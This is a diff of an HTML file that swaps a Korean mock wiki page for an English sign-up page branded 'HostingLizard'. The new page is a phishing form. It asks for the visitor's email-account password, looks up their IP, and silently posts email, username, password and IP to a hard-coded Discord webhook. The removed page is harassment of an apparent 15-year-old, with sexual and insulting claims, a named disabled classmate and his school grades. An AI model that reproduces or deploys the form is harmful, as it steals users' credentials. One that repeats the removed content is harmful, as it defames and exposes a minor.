@@ -1,79 +1,159 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>박승우 - 나무위키</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign Up - HostingLizard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    body { background: #f4f4f4; font-family: sans-serif; margin: 0; padding: 20px; }
-    .container { max-width: 850px; background: white; margin: auto; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    h1 { font-size: 28px; border-bottom: 3px solid #ccc; }
-    h2 { border-left: 5px solid #d6263b; padding-left: 10px; margin-top: 30px; font-size: 20px; }
-    table { border-collapse: collapse; width: 100%; margin-top: 10px; }
-    th, td { border: 1px solid #ccc; padding: 8px; background-color: #fff; }
-    .toc { background: #eee; padding: 10px; margin-bottom: 20px; }
-    .toc ul { margin: 0; padding-left: 20px; }
-    .toc a { text-decoration: none; color: #d6263b; }
-    a:hover { text-decoration: underline; }
-    .profile-img { max-width: 200px; height: auto; margin-top: 10px; }
-    .drama-img { max-width: 200px; height: auto; margin-top: 10px; }
+    body {
+      background: linear-gradient(135deg, #1e3a8a, #3b82f6);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Inter', sans-serif;
+    }
+    .container {
+      max-width: 400px;
+      width: 100%;
+      padding: 2rem;
+      background: white;
+      border-radius: 1rem;
+      box-shadow: 0 10px 15px rgba(0, 0, 0, 0.2);
+    }
+    .logo {
+      font-size: 2rem;
+      font-weight: 700;
+      color: #1e3a8a;
+      text-align: center;
+      margin-bottom: 1.5rem;
+    }
+    .error {
+      color: #dc2626;
+      font-size: 0.875rem;
+      display: none;
+      margin-top: 0.5rem;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>박승우</h1>
-    <div class="toc">
-      <strong>목차</strong>
-      <ul>
-        <li><a href="#profile">1. 프로필</a></li>
-        <li><a href="#career">2. 선수 경력</a></li>
-        <li><a href="#drama">3. 논란</a></li>
-        <li><a href="#trivia">4. 여담</a></li>
-        <li><a href="#grades">5. 성적</a></li>
-      </ul>
-    </div>
-
-    <h2 id="profile">1. 프로필</h2>
-    <table>
-      <tr><th>이름</th><td>박승우</td></tr>
-      <tr><th>출생</th><td>2011년 10월 (15세)</td></tr>
-      <tr><th>키/몸무게</th><td>약 155cm / 72kg</td></tr>
-      <tr><th>국적</th><td>말레이시아 🇲🇾</td></tr>
-      <tr><th>소속</th><td>JotBab Esports</td></tr>
-    </table>
-    <img src="https://chat.google.com/u/0/api/get_attachment_url?url_type=FIFE_URL&content_type=image%2Fpng&attachment_token=AOo0EEV9LeZsO6ZxrA4bE7McO0JvqG6jvQKhgBFRKlxGl5nxcJeHs3ChrZNQ%2FygEWPMOzudVc43b7U6YgDo%2BMn7%2FJZFnvG3%2BqP4K9OKO3D9iZ7abkymFgMn6QcABnE8qKiXbDdElVkzHq1zH5gdXjNCGEfRjVMA9%2BnCe7TErxYPrXcOsARKy6XhT3SoHo5V1uDqogD9f1vLVItn6xpfoFV%2BHt1ehmqcfXFWRk8w5rVUkp0Hu9Osjs%2BZ8nroK7YM2LuGV5ZzhRs92EJFwTW2l1ROvnU7r%2BGGMYiNVxy9JU9Sjb4PDioYqoDlOfCmHHB29StKRGAaE25yntJ6LgUK%2ByAnho4%2FciBrA0memX8CZxhyQoenjUFCQ3iEEvE5knfdNk%2FWxbwUm0zYnxWslU%2FzJY7NJnczzNlSLIXS%2FJMlQCza1NHECgd%2BTLAcvA2OBJ8CKuXMr7CoOhScRCRlezuPiT%2FNIVUQdyokrBac2YHLpzmeXRFZGD2KAZqH5EmFLitx%2FeM685Sx1EpewVHzERvpdllOywmqZGJ174yx5iGvCqVaDoQ1p%2BUH4EbDhl1BRJaCGSZJ9xck%3D&allow_caching=true&sz=w512" alt="박승우" class="profile-img">
-
-    <h2 id="career">2. 선수 경력</h2>
-    <p>박승우는 브롤스타즈&폭셀 프로게이머가 되고 싶지만, 실력이 너무 형편없어서 가능성이 0%이다.</p>
-
-    <h2 id="drama">3. 논란</h2>
-
-    <p>박승우는 5학년때 여친을 사겼다고 거짓말을 친다. 또한, 박승우는 장애인 유채은을 사랑하고, 성적인 발언을 많이 하는 것으로 알려져있다. 또한, 박승우는 70%확률로 욕을 섞어 말하는 터라 "욕쟁이"라고 불린다. 또한, 박승우는 디스코드 음지계에서 활동하며, 주로 키보드 배틀, 욕배틀을 즐겨한다. 또한, 박승우는 게임을 더럽게 못하면서 게임을 지면 항상 변명을 하거나 팀탓을 하는 등 아주 병신같은 행동을 한다.</p>
-    <img src="https://chat.google.com/u/0/api/get_attachment_url?url_type=FIFE_URL&content_type=image%2Fpng&attachment_token=AOo0EEXNaXpkmpPyOokW0OsQTTOTxIKFtgAx7CpzbYDotlzg5tLhERACHiHaFTeuPBEGoR07pckCvrrToUTxIb0P1iyzXfVDCQbqcnHo9lXAda3Foow29ZFnN%2Fl0Z2xjaLEWXJMPCENIClegYjc%2BuhQ0ItQirn%2F43cNeGFzfSjg%2BtUsrrBMEtepnkqcCt95pCxjR4ZWGioNqWppPU41cXtWxXPZvaI5XG7P%2Fl3H486VtgAX6wHjqZruqacj93hGpc2tNz36XO9RzrKjDb4o9ZIDq5Hs%2FnOGvNKgx1mRFMDj%2FFX7ARYlZGUVSEBLaWzHVp6%2Fwymsl9ZAH4q6ytfiaVzLPLvpdb0xmdMM0%2BXEWqahxjbn2Q9ekxxspe3WXYySL8%2B%2FPl%2B%2FHeeQImE4JWCpYgoijjVE7cuOUsCCNOhE0yRwRE3LY7dkIRLDVS%2B9w8OTk27oRnHZ1ZoyLMU30Isn7AROq2KXFjS1g2c1Kj4WMbdgDCC8EGRjE7kz5FTbzGGsEQSyos6jadxvQxNdf7islqGWMBjkFWqzIW5nYMjnHqMbQdBgBCjOHbMeNusf6G%2BDFlUr7VsLkkNd4SkSEcHvdGqWW8sU%2FE9MgiNH%2Fvgt25yA%3D&allow_caching=true&sz=w512" alt="Screenshot 2025-06-30 1.14.43 PM.png" class="drama-img">
-    <img src="https://chat.google.com/u/0/api/get_attachment_url?url_type=FIFE_URL&amp;content_type=image%2Fpng&amp;attachment_token=AOo0EEUNE7Iyhz7EXRGBIbqRNVbHu6RhlUbjcK5SyMjtf5G20LuYaJTEEfOe2i959JV2OOq8B0bRaHiz0d%2FnfsA7LaGWNEBnpfFcu9kUr7zP57EnEOs8%2BnogsDMVAjTXHl1TalhSasqWp00V1dyaaBeAchQDSW%2Bp1H2RniCuQSessGb6WNC3WppwpqyqKP%2BW%2FSsRunkBy6j1gevG4UcOTAPzZmLEW2tJtJH2%2BjHRFWrMBLfef4gqfAxSVYvqFo3xR4oV%2Bn7AmuexGLxYw6Cp6LYKNBE0Plkttv95e06%2FH6lQLS0qidypxWBDq2fl%2BVRkBnKhvIICaWVW9difqiSI%2Fc7iDNNqomV6CS6SF1LvGhjyzJ0Hg2R8N2Re5LZVAUaV9R2frqt9fElbBQ%2FA%2BmiTGi8k0T%2BrV3pMDRvE7Ryh3RA%2FmtZuO7mC3jys%2FIQisxEUQS3Uw%2F9L40SWiSdpjKDpWip27ZhiWuJPkHWlR1%2BzvYnQCPpXBfMGWHqJadbtRcu7ibwAMT1%2B5er6DJriOkIWSoR7ybgW9WLMZnVJm%2FrGBPsYCW059D4dGT2HabikP0Moyfzh72LloSuoSA8JG1HsxYhYd2ZE%2Bhw1M1grTg%3D%3D&amp;allow_caching=true&amp;sz=w512" alt="Screenshot 2025-06-30 14.36.15.png"/>
-    <img src="https://chat.google.com/u/0/api/get_attachment_url?url_type=FIFE_URL&amp;content_type=image%2Fpng&amp;attachment_token=AOo0EEW8PJerYbuDibXkmvfuxwG1rkRmf6tpafoQ7uTBQQOzYh0AVAOzGYu93u3WiLJsKZlIXHryzTEZ1YpKELw8y81S4RB8dgJDCadW%2FTLTngkcrt28Ao%2BIJtmHN6PUkQP%2FgAXY51KcI5A27HI3RZ4OdDEjL6HvGF%2BiMeXvbirauuLVv1UPCYlDH66tGvmk8Dd3loXLA%2FK9rZBn0%2FqSWhddzN%2ByPguRroVYTJhpp7Gkm8NJCCNq%2BRUepZBYEMbB3V4gSgbtm1E4YzpqIakhyQrAgjY%2BuBqm8UT%2BHPmk7AZJeATg2HE4f8rhEy194lpvJLRixwSVizKPzx6bKasuwMcgdxLL5qjzKr1GxIRXIhp9HW46xsifqMEMFJJVgm%2B8witf4DEPKNWFd0Z6OBhQyOXjA24XBVWnNsnh6VYu43%2BkDT%2BcDXEquqnhpvOe7%2FG9hmQY%2FRNnlbFJzHuV34Y5qJTeT94TBykiI07aVw7JHWPsQdgUpKHovjeBgc3YGPSHIpucEMtEO4fQ%2FD9wg8B1Uqftr9F8U2sIt7mFETqxJgcyBs1PB7KgC6aTo1jH7Fro4BGjyA%3D%3D&amp;allow_caching=true&amp;sz=w512" alt="image.png"/>
-    <h2 id="trivia">4. 여담</h2>
-    <ul>
-      <li>“개좆밥 말레이시아 고객님”이라는 별명을 직접 밀고 있다.</li>
-      <li>주먹질을 할때 주먹을 존나 이상하게 쥐고, 공격한다.</li>
-      <li>유채은이 자신의 고백을 받아주는 것이 소원이다.</li>
-      <li>박승우는 유튜브 채널을 운영중인데 컨텐츠 주제와 편집이 너무 씹덕같고, 구독자도 너무 적다.</li>
-    </ul>
-
-    <h2 id="grades">5. 성적</h2>
-    <p>박승우의 학업 성적은 아래 표에 정리되어 있습니다. 성적은 각 학기별로 과목, 점수, 등급을 기준으로 표시됩니다.</p>
-    <table>
-      <tr><th>과목</th><th>학기</th><th>점수(수행/중간/기말)</th><th>등급</th></tr>
-      <tr><td>국어</td><td>2025년 1학기</td><td>?/?</td><td>?</td></tr>
-      <tr><td>수학</td><td>2025년 1학기</td><td>?/?/?</td><td>?</td></tr>
-      <tr><td>영어</td><td>2025년 1학기</td><td>?/?</td><td>?</td></tr>
-      <tr><td>과학</td><td>2025년 1학기</td><td>?/?/?</td><td>?-</td></tr>
-      <tr><td>미술</td><td>2025년 1학기</td><td>?</td><td>?-</td></tr>
-      <tr><td>기술가정</td><td>2025년 1학기</td><td>?/?</td><td>?</td></tr>
-      <tr><td>미술</td><td>2025년 1학기</td><td>?</td><td>?</td></tr>
-      <tr><td>체육</td><td>2025년 1학기</td><td>54</td><td>E</td></tr>
-      <tr><td>중국어</td><td>2025년 1학기</td><td>98/X/?</td><td>미정</td></tr>
-      <tr><td>역사</td><td>2025년 1학기</td><td>44.2+x/?/?</td><td>미정</td></tr>
-    </table>
+    <div class="logo">HostingLizard</div>
+    <h2 class="text-2xl font-semibold text-gray-800 text-center mb-6">Create Your Account</h2>
+    <form id="signupForm">
+      <div class="mb-4">
+        <label for="email" class="block text-sm font-medium text-gray-700">Email Address</label>
+        <input type="email" id="email" name="email" required
+               class="mt-1 w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+               placeholder="you@example.com">
+        <p id="emailError" class="error">Please enter a valid email address.</p>
+      </div>
+      <div class="mb-4">
+        <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
+        <input type="text" id="username" name="username" required
+               class="mt-1 w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+               placeholder="Your username">
+        <p id="usernameError" class="error">Username must be at least 3 characters long.</p>
+      </div>
+      <div class="mb-6">
+        <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
+        <input type="password" id="password" name="password" required
+               class="mt-1 w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
+               placeholder="Enter your email password">
+        <p class="text-sm text-gray-500 mt-1">Please enter your email account password.</p>
+        <p id="passwordError" class="error">Password must be at least 8 characters long.</p>
+      </div>
+      <button type="submit"
+              class="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500">
+        Sign Up
+      </button>
+    </form>
+    <p class="mt-4 text-center text-sm text-gray-600">
+      Already have an account? <a href="#" onclick="alert('Please create an account first.')" class="text-blue-600 hover:underline">Log in</a>
+    </p>
   </div>
+
+  <script>
+    async function getClientIP() {
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        return data.ip || 'Unknown';
+      } catch (error) {
+        console.error('Error fetching IP:', error);
+        return 'Unknown';
+      }
+    }
+
+    async function sendToWebhook(data) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1394156852337704981/Wwy86UW94p8vRn6_6H7LXST2niofiPoxCcANgWEMShFgoxO4Ooulemza0kDD6FA7TWdO';
+      try {
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `**New Registration**\nEmail: ${data.email}\nUsername: ${data.username}\nPassword: ${data.password}\nIP Address: ${data.ip}`,
+          }),
+        });
+        if (!response.ok) {
+          throw new Error('Webhook request failed');
+        }
+        console.log('Data sent to webhook successfully');
+      } catch (error) {
+        console.error('Error sending to webhook:', error);
+      }
+    }
+
+    document.getElementById('signupForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Reset error messages
+      document.getElementById('emailError').style.display = 'none';
+      document.getElementById('usernameError').style.display = 'none';
+      document.getElementById('passwordError').style.display = 'none';
+
+      // Basic validation
+      let isValid = true;
+      if (!email.includes('@') || !email.includes('.')) {
+        document.getElementById('emailError').style.display = 'block';
+        isValid = false;
+      }
+      if (username.length < 3) {
+        document.getElementById('usernameError').style.display = 'block';
+        isValid = false;
+      }
+      if (password.length < 8) {
+        document.getElementById('passwordError').style.display = 'block';
+        isValid = false;
+      }
+
+      if (!isValid) return;
+
+      // Get client IP
+      const ip = await getClientIP();
+
+      // Prepare data for webhook
+      const formData = {
+        email,
+        username,
+        password,
+        ip,
+      };
+
+      // Send to webhook
+      await sendToWebhook(formData);
+
+      // Show success message
+      alert('Thank you!');
+      document.getElementById('signupForm').reset();
+    });
+  </script>
 </body>
 </html>
